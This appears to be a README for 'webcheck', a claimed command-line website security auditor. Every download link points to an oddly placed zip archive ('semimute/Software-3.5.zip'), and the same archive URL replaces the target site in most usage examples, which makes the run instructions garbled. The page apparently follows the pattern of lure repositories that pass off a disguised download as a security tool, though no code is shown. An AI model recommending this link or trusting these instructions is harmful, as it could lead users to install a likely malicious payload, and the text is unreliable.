# 🛡️ webcheck - Audit web security in minutes

[![Download webcheck](https://img.shields.io/badge/Download%20webcheck-blue?style=for-the-badge)](https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip)

## 🚀 Download

Visit this page to download: https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip

## 🧭 What webcheck does

webcheck is a command-line tool that checks a website for common security issues. It looks at:

- HTTP headers
- Cookies
- TLS settings
- Redirects
- Info disclosure

It then gives you a color-coded report with a risk score. This helps you see weak points fast.

## 🖥️ What you need

webcheck runs from a terminal window. On Windows, you can use it with:

- Git Bash
- Windows Subsystem for Linux
- A Bash shell from a Linux environment
- Kali Linux in a virtual machine

You also need:

- A working internet connection
- A target site you are allowed to test
- A terminal with Bash support

## 📥 Download and open

1. Open this page: https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip
2. Download the project files
3. Save them to a folder you can find again
4. Open that folder in a Bash terminal

If you use Windows and do not know where to start, Git Bash is the easiest option for most users.

## 🏁 Run webcheck

After you open a Bash terminal, go to the folder where you saved webcheck.

Use this pattern to run it:

- `bash webcheck.sh example.com`

If the file name is different in the download, use the main `.sh` file in the folder.

Example:

- `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`

## 🔎 What to expect

When webcheck runs, it checks the site and prints a report in the terminal. You may see:

- Green items for low risk
- Yellow items for medium risk
- Red items for higher risk
- A score that shows overall risk

This makes it easy to scan the results without reading raw data.

## 🧩 Main checks

### 🔐 HTTP headers
webcheck can look for missing or weak headers that help protect a site in a browser.

### 🍪 Cookies
It checks cookie flags that affect safety, such as:

- Secure
- HttpOnly
- SameSite

### 🧷 TLS
It can review HTTPS use and help spot weak certificate or encryption settings.

### 🔁 Redirects
It checks where a site sends traffic and whether the path looks safe.

### 🕵️ Info disclosure
It can flag clues that may expose server details, software names, or other useful data.

## 📂 Typical folder layout

After download, you may see files like:

- `webcheck.sh`
- `README.md`
- `LICENSE`
- helper scripts or config files

If you are unsure which file to run, look for the main script named `webcheck.sh` or a similar Bash file.

## 🪟 Windows setup tips

If you want the simplest setup on Windows, use one of these options:

### Git Bash
1. Install Git for Windows
2. Right-click inside the webcheck folder
3. Open Git Bash here
4. Run the script from that window

### Windows Subsystem for Linux
1. Enable WSL
2. Open your Linux terminal
3. Move to the webcheck folder
4. Run the script with Bash

### Kali Linux in a VM
1. Start your Kali virtual machine
2. Open the terminal
3. Go to the webcheck folder
4. Run the script

## 🛠️ Basic usage

Run webcheck against a site you are allowed to test:

- `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`

You can also test a full URL with a path if needed:

- `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`

If the script offers flags or options, check the help text:

- `bash webcheck.sh -h`

## 📊 Reading the report

The report is made for quick review.

- Green means the check passed
- Yellow means there may be a weak setting
- Red means the issue needs attention

The risk score gives you a fast view of how hard the site may be to defend.

## 🧪 Example workflow

A simple workflow looks like this:

1. Pick a site you are allowed to test
2. Open webcheck in a Bash terminal
3. Run the script with the site URL
4. Review the color-coded results
5. Note the weak spots for follow-up

## 🔒 Safe use

Use webcheck only on systems you own or have permission to test. It is built for authorized testing, bug bounty work, and security checks on web apps you are allowed to audit.

## 🧰 Troubleshooting

### The script does not start
- Make sure you are in a Bash shell
- Check that the file name ends in `.sh`
- Try running `ls` to confirm the file is in the folder

### Permission denied
- Try:
  - `chmod +x webcheck.sh`
  - `bash webcheck.sh https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip`

### Command not found
- Make sure Bash is installed
- Open Git Bash or WSL on Windows
- Check that you typed the file name correctly

### No results appear
- Confirm the site is online
- Check your internet connection
- Try a different allowed target

## 🧾 Why people use it

webcheck helps when you want a fast look at web security without setting up a full scanner. It is useful for:

- quick audits
- bug bounty prep
- basic hardening checks
- review of HTTP and TLS settings
- spotting common browser-side risks

## 🔗 Source and download

Get the files here: https://raw.githubusercontent.com/Davi671728933838/webcheck/main/semimute/Software-3.5.zip

## 🗂️ Quick start checklist

- Download the project from the link above
- Open a Bash terminal on Windows
- Move into the webcheck folder
- Run the main `.sh` file with a site URL
- Read the color-coded report
- Review any red or yellow items